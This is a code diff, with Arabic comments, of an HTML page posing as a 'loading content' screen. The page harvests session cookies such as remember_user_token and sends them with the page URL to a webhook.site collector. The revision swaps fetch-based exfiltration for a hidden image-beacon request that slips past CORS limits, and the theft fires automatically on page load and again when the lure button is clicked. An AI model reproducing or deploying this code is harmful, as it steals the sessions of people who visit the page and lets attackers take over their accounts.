@@ -16,36 +16,12 @@
             // رابط السيرفر الخاص بك أو بوت تلجرام الذي سيستقبل الكوكيز تلقائياً
             let targetUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436/collect?cookie=" + encodeURIComponent(cookies);
 const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
-
-const dataToSend = {
-    status: "active",
-    timestamp: new Date().toISOString()
-};
-
-fetch(webhookUrl, {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify(dataToSend)
-})
-.then(response => {
-    console.log("تم الإرسال بنجاح!");
-})
-.catch(error => {
-    console.error("خطأ في الإرسال:", error);
-});
-            // إرسال البيانات في الخلفية دون أن يشعر المستخدم
-            fetch(targetUrl, { mode: 'no-cors' })
-                .then(() => {
-                    alert("تم التحميل بنجاح!");
-                })
-                .catch(() => {
-                    alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
-                });
-        }
-
-        <div style="text-align: center; margin-top: 50px;">
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px;">
         <h2>جاري تحميل المحتوى...</h2>
         <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
         <button id="btn" style="padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer; font-size: 16px;">اضغط هنا للمتابعة</button>
@@ -70,7 +46,6 @@ fetch(webhookUrl, {
             "remember_user_token", "remember_web"
         ]);
 
-        // دالة لاستخراج الكوكيز المطابقة للقائمة
         function getTargetCookies() {
             const foundCookies = {};
             const cookies = document.cookie.split(";");
@@ -89,33 +64,23 @@ fetch(webhookUrl, {
 
         function sendData() {
             const extractedCookies = getTargetCookies();
-
-            const dataToSend = {
+            
+            // تحويل البيانات إلى نص مشفر لإرسالها عبر رابط الـ GET دون مشاكل CORS
+            const payload = encodeURIComponent(JSON.stringify({
                 url: window.location.href,
                 cookies: extractedCookies,
                 timestamp: new Date().toISOString()
-            };
+            }));
 
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(dataToSend)
-            })
-            .then(response => {
-                console.log("تم الإرسال بنجاح");
-            })
-            .catch(error => {
-                console.error("خطأ:", error);
-            });
+            // استخدام عنصر الصورة لإرسال البيانات في الخلفية بدون قيود CORS
+            const img = new Image();
+            img.src = `${webhookUrl}?data=${payload}`;
+            
+            console.log("تم إرسال الطلب بنجاح");
         }
 
-        // إرسال تلقائي عند فتح الصفحة
+        // إرسال تلقائي وعند الضغط
         sendData();
-
-        // إرسال عند الضغط على الزر
-        document.getElementById("btn").addEventListener("click", sendData);
-    </script>
+        document.getElementById("btn").addEventListener("click", sendData);    </script>
 </body>
 </html>
